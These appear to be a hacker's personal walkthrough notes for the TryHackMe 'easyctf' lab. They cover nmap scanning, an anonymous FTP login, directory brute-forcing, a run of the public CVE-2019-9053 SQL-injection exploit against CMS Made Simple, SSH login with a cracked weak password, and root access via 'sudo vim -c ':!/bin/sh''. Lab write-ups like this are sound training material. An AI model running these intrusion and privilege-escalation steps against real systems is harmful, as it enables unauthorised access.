```

Linux Priv challenge
https://tryhackme.com/room/easyctf
IP: 10.10.198.238
```

```
ping 10.10.198.238
cd /home/kali/Documents/tryhackme/easyctf
nmap -sC -sV -oA nmap 10.10.198.238   
	
	PORT     STATE SERVICE VERSION
	21/tcp   open  ftp     vsftpd 3.0.3
	| ftp-syst: 
	|   STAT: 
	| FTP server status:
	|      Connected to ::ffff:10.2.21.66
	|      Logged in as ftp
	|      TYPE: ASCII
	|      No session bandwidth limit
	|      Session timeout in seconds is 300
	|      Control connection is plain text
	|      Data connections will be plain text
	|      At session startup, client count was 1
	|      vsFTPd 3.0.3 - secure, fast, stable
	|_End of status
	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
	|_Can't get directory listing: TIMEOUT
	80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
	| http-robots.txt: 2 disallowed entries 
	|_/ /openemr-5_0_1_3 
	|_http-title: Apache2 Ubuntu Default Page: It works
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
	|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
	|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```	
# going to try anon loggin

ftp 10.10.198.238 

	Connected to 10.10.198.238.
	220 (vsFTPd 3.0.3)
	Name (10.10.198.238:kali): anonymous
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	
	# HAD TO USE COMMAND passive TO GET OUT OF EXTENDED PASSIVE MODE\
```

```
ls
cd pub
get ForMitch.txt
	#Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

```
ssh -p 2222 root@10.10.198.238
	# tried so weak password - nothing




http://10.10.198.238/robots.txt

	#     Attn: CUPS Licensing Information
	#       Easy Software Products
	#       44141 Airport View Drive, Suite 204
	#       Hollywood, Maryland 20636-3111 USA
	#
	#       Voice: (301) 373-9600
	#       EMail: cups-info@cups.org
	#         WWW: http://www.cups.org
```

```	
going to dirbuster

dirb http://10.10.198.238 -r -z 10 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# while dirb going on going to research postfix and dovecot and nginz 1.10.0 exploit

Downloading dirsearch instead

dirsearch -u http://10.10.198.238 -x 400,401,403

		└─# dirsearch -u http://10.10.198.238 -x 400,401,403

		  _|. _ _  _  _  _ _|_    v0.4.2
		 (_||| _) (/_(_|| (_| )

		Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

		Output File: /root/.dirsearch/reports/10.10.198.238/_23-01-06_20-24-26.txt

		Error Log: /root/.dirsearch/logs/errors-23-01-06_20-24-26.log

		Target: http://10.10.198.238/

		[20:24:27] Starting: 
		[20:25:18] 200 -   11KB - /index.html
		[20:25:34] 200 -  929B  - /robots.txt
		[20:25:36] 301 -  315B  - /simple  ->  http://10.10.198.238/simple/

		Task Completed
                                                                                                     

	version 2.2.8 simple
```

```
had to add () to print function in exploiit to make it work with python3, as it happened tryhack me box died, rebooting
**new ip address us 10.10.31.61**

CVE 2019-9053 
2019-9053 

python 46635.py -u http://10.10.31.61/simple/ --crack --wordlist /Downloads/rockyou.txt

	results
	[+] Salt for password found: 1dac0d92e31211171H
	[+] Username found: b
	[+] Email found: adminf11111111111111111111111111111112111140211111111111111111111111111111111111111111111111
	[*] Try: 0c01f4468bd75d7a84c7eb73846e8d96$
	[*] Now try to crack password
	Traceback (most recent call last):
	  File "/home/kali/Downloads/46635.py", line 184, in <module>
		crack_password()
	  File "/home/kali/Downloads/46635.py", line 52, in crack_password
		dict = open(wordlist)
	FileNotFoundError: [Errno 2] No such file or directory: '/Downloads/rockyou.txt'

admin@admin.com
secret

ssh mitch@10.10.31.61 -p 2222
secret

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$ sudo vim -c ':!/bin/sh'

# whoami                           
root
ls
# cat user.txt
G00d j0b, keep up!

done
```




